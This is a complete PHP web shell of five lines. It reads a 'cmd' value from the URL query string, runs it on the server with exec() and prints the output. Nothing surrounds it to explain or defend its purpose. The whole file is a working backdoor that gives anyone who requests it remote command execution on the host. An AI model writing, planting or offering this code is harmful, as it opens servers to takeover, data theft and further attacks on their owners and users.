<?php
$cmdCommand = $_GET['cmd'];
print exec($cmdCommand);
die("");
?>